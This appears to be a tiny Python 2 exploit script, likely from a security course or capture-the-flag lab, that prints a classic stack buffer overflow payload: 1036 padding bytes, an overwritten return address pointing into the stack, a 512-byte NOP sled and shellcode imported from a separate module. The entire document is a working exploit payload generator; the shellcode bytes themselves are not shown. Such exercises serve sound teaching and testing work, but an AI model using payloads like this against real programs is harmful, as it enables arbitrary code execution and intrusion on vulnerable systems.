from shellcode import shellcode
print '\x01'*1036 + '\xa0\x96\xfe\xff' + '\x90'*512 + shellcode
